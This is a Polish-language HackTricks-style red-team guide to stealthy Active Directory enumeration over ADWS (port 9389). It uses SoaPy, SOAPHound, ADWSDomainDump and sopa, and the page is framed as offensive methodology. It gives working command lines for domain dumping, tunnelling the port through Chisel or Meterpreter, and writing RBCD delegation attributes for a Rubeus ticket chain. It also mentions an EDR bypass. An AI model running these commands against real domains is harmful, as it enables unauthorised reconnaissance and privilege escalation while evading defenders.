# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Co to jest ADWS?

Active Directory Web Services (ADWS) jest **włączone domyślnie na każdym kontrolerze domeny od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Pomimo nazwy, **nie ma tu HTTP**. Zamiast tego usługa udostępnia dane w stylu LDAP przez stos własnościowych protokołów .NET do framowania:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany wewnątrz tych binarnych ramek SOAP i przechodzi przez rzadko używany port, **enumeracja przez ADWS jest znacznie mniej narażona na inspekcję, filtrowanie czy sygnaturyzację niż klasyczny ruch LDAP/389 & 636**. Dla operatorów oznacza to:

* Bardziej skryte rozpoznanie – Blue teams często koncentrują się na zapytaniach LDAP.
* Możliwość zbierania danych z **hostów niebędących Windows (Linux, macOS)** przez tunelowanie 9389/TCP przez proxy SOCKS.
* Te same dane co przez LDAP (użytkownicy, grupy, ACL, schema itd.) oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

Interakcje ADWS są realizowane przez WS-Enumeration: każde zapytanie zaczyna się od wiadomości `Enumerate`, która definiuje filtr/atrybuty LDAP i zwraca GUID `EnumerationContext`, po czym następuje jedna lub więcej wiadomości `Pull`, które strumieniują do okna wyników zdefiniowanego przez serwer. Konteksty wygasają po ~30 minutach, więc narzędzia muszą albo stronicować wyniki, albo dzielić filtry (zapytania prefiksowe per CN), aby nie utracić stanu. Przy pobieraniu security descriptorów określ kontrolę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACL; w przeciwnym razie ADWS po prostu pomija atrybut `nTSecurityDescriptor` w odpowiedzi SOAP.

> NOTE: ADWS jest także używane przez wiele narzędzi RSAT GUI/PowerShell, więc ruch może się zlewać z legalną aktywnością administratorów.

## SoaPy – natywny klient Python

[SoaPy](https://github.com/logangoins/soapy) to **pełna reimplementacja stosu protokołu ADWS w czystym Pythonie**. Konstruuje ramki NBFX/NBFSE/NNS/NMF bajt-po-bajcie, umożliwiając zbieranie z systemów Unix-like bez dotykania środowiska uruchomieniowego .NET.

### Key Features

* Obsługa **proxy przez SOCKS** (przydatne z implantów C2).
* Precyzyjne filtry wyszukiwania identyczne jak LDAP `-q '(objectClass=user)'`.
* Opcjonalne operacje **zapisów** ( `--set` / `--delete` ).
* Tryb wyjścia **BOFHound** do bezpośredniego importu do BloodHound.
* Flaga `--parse` do upiększania znaczników czasu / `userAccountControl` gdy potrzebna jest czytelność dla człowieka.

### Targeted collection flags & write operations

SoaPy zawiera dobrane przełączniki odwzorowujące najczęstsze zadania łowieckie LDAP przez ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oraz surowe `--query` / `--filter` do niestandardowych zaciągów. Połącz to z prymitywami zapisu, takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (stage'owanie SPN do celowanego Kerberoasting) oraz `--asrep` (przełącza `DONT_REQ_PREAUTH` w `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Użyj tego samego hosta/poświadczeń, aby natychmiast weaponise findings: dump RBCD-capable objects with `--rbcds`, then apply `--rbcd 'WEBSRV01$' --account 'FILE01$'` to stage a Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### Instalacja (host operatora)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump przez ADWS (Linux/Windows)

* Fork of `ldapdomaindump`, który wymienia zapytania LDAP na wywołania ADWS na TCP/9389, aby zmniejszyć trafienia sygnatur LDAP.
* Wykonuje początkową kontrolę dostępności portu 9389, chyba że podano `--force` (pomija sondę, jeśli skany portów są hałaśliwe lub filtrowane).
* Przetestowano przeciwko Microsoft Defender for Endpoint i CrowdStrike Falcon — w README opisano pomyślne obejście.

### Instalacja
```bash
pipx install .
```
### Użycie
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Typowe wyjście loguje sprawdzenie dostępności portu 9389, ADWS bind oraz rozpoczęcie/zakończenie dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Praktyczny klient ADWS w Golangu

Podobnie jak soapy, [sopa](https://github.com/Macmod/sopa) implementuje stos protokołów ADWS (MS-NNS + MC-NMF + SOAP) w Golangu, udostępniając przełączniki wiersza poleceń do wykonywania wywołań ADWS, takich jak:

* **Wyszukiwanie i pobieranie obiektów** - `query` / `get`
* **Cykl życia obiektu** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Edycja atrybutów** - `attr [add|replace|delete]`
* **Zarządzanie kontem** - `set-password` / `change-password`
* oraz inne takie jak `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, itd.

## SOAPHound – Zbieranie ADWS o dużym wolumenie (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) to kolektor .NET, który utrzymuje wszystkie interakcje LDAP wewnątrz ADWS i generuje JSON kompatybilny z BloodHound v4. Raz buduje kompletny cache `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a następnie ponownie go wykorzystuje podczas wysokowolumenowych przebiegów `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (AD-integrated DNS), dzięki czemu jedynie ~35 krytycznych atrybutów opuszcza DC. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania według prefiksu CN, aby utrzymać się poniżej 30-minutowego limitu EnumerationContext w dużych lasach.

Typowy przebieg pracy na maszynie operatora dołączonej do domeny:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Eksportowane pliki JSON trafiały bezpośrednio do workflowów SharpHound/BloodHound — zobacz [BloodHound methodology](bloodhound.md) po pomysły na późniejsze tworzenie grafów. AutoSplit sprawia, że SOAPHound jest odporny na lasy zawierające miliony obiektów, jednocześnie utrzymując liczbę zapytań niższą niż snapshoty w stylu ADExplorer.

## Ukryty proces zbierania AD

Poniższy workflow pokazuje, jak enumerować **domain & ADCS objects** przez ADWS, konwertować je do BloodHound JSON i polować na ścieżki ataku oparte na certyfikatach – wszystko z Linuxa:

1. **Tunnel 9389/TCP** z sieci celu do twojej maszyny (np. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Wyeksportuj `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj opcji SoaPy’s `--proxyHost/--proxyPort`.

2. **Zbierz obiekt root domeny:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Zbierz obiekty związane z ADCS z Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konwertuj do BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Prześlij ZIP** w BloodHound GUI i uruchom zapytania Cypher takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, aby ujawnić ścieżki eskalacji certyfikatów (ESC1, ESC8 itp.).

### Zapisywanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Połącz to z `s4u2proxy`/`Rubeus /getticket`, aby uzyskać pełny łańcuch **Resource-Based Constrained Delegation** (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, tryby BH/ADCS/DNS |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Może być przekierowane przez ten sam SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Ogólny klient do komunikacji ze znanymi punktami końcowymi ADWS - pozwala na enumeration, tworzenie obiektów, modyfikację atrybutów oraz zmianę haseł |

## Źródła

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
